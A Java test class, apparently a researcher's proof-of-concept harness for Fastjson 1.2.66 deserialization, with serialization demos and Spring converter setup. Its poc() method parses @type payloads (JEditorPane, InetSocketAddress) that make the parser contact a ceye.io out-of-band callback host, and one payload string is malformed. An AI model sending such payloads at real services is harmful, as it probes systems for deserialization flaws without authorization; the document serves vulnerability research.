package com.orleven.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.alibaba.fastjson.support.config.FastJsonConfig;
import com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.http.HttpMessageConverters;
import org.springframework.context.annotation.Bean;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@SpringBootApplication
public class Fastjson1266 implements WebMvcConfigurer {

    public void test(){
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("key1", "One");
        map.put("key2", "Two");
        String mapJson = JSON.toJSONString(map);
        System.out.println(mapJson);

        User user1 = new User();
        user1.setUsername("orleven");
        user1.setAge(18);
        System.out.println("obj name:" + user1.getClass().getName());
        System.out.println();

        //序列化
        String serializedStr = JSON.toJSONString(user1);
        System.out.println("serializedStr = " + serializedStr);
        String serializedStr1 = JSON.toJSONString(user1, SerializerFeature.WriteClassName);
        System.out.println("serializedStr1 = " + serializedStr1);
        System.out.println();

        //通过parse方法进行反序列化
        Object obj1 = (Object)JSON.parse(serializedStr1);
        System.out.println(obj1);
        System.out.println("obj1 name: " + obj1.getClass().getName()+"\n");
        System.out.println();

        //通过parseObject方法进行反序列化  通过这种方法返回的是一个JSONObject
        Object obj2 = JSON.parseObject(serializedStr1);
        System.out.println(obj2);
        System.out.println("obj2 name: " + obj2.getClass().getName()+"\n");
        System.out.println();

        //通过这种方式返回的是一个相应的类对象
        Object obj3 = JSON.parseObject(serializedStr1, Object.class);
        System.out.println(obj3);
        System.out.println("obj3 name: " + obj3.getClass().getName());
        System.out.println();


        String myJSON = "{\"@type\":\"me.lightless.fastjsonvuln.User\",\"age\":99,\"username\":\"lightless\",\"secret\":\"2333\"}";
        System.out.println(myJSON);
        JSONObject u3 = JSON.parseObject(myJSON);
        System.out.println("u3 => " + u3.get("secret"));
    }


    public void poc(){

        String myJSON = "{\"@type\":\"javax.swing.JEditorPane\",\"page\":\"http://md98c8.2w3co3.ceye.io\"}";
//        myJSON = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"aaaa.2w3co3.ceye.io\"}}";
        myJSON = "{\"@type\":\"java.net.InetSocketAddress\",\"address\":,\"val\":\"aaaa.2w3co3.ceye.io\"}}";
        System.out.println(myJSON);
        JSONObject u3 = JSON.parseObject(myJSON);
        System.out.println("u3 => " + u3.get("secret"));
    }


    /**
     * 覆盖方法configureMessageConverters，使用fastJson
     * @return
     */
    @Bean
    public HttpMessageConverters fastJsonHttpMessageConverters() {
        //1、定义一个convert转换消息的对象
        FastJsonHttpMessageConverter fastConverter = new FastJsonHttpMessageConverter();
        //2、添加fastjson的配置信息
        FastJsonConfig fastJsonConfig = new FastJsonConfig();
        fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat);
        //3、在convert中添加配置信息
        fastConverter.setFastJsonConfig(fastJsonConfig);
        //4、将convert添加到converters中
        HttpMessageConverter<?> converter = fastConverter;
        return new HttpMessageConverters(converter);
    }

    @Override
    public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
        //1、定义一个convert转换消息的对象
        FastJsonHttpMessageConverter fastConverter = new FastJsonHttpMessageConverter();
        //2、添加fastjson的配置信息
        FastJsonConfig fastJsonConfig = new FastJsonConfig();
        fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat);
        //3、在convert中添加配置信息
        fastConverter.setFastJsonConfig(fastJsonConfig);
        //4、将convert添加到converters中
        converters.add(fastConverter);
    }

    public static void main(String args[]){
//        SpringApplication.run(Fastjson1266.class, args);
        try {
            ParserConfig config = new ParserConfig();
//            config.setAutoTypeSupport(true);
//            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

            Fastjson1266 fastjson1266 = new Fastjson1266();
//            fastjson1266.test();

            fastjson1266.poc();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
